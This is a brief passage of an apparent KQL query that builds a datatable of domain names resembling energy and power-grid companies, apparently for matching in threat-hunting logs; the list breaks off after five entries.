let domains = datatable(domain: string)
[
  "renewablesolutionspowergrid.com",
  "energycorp-powergrid.com",
  "renewablesolutions-powergrid.com",
  "energycorpgriddefender.com",
  "renewablesolutions-griddefender.com",
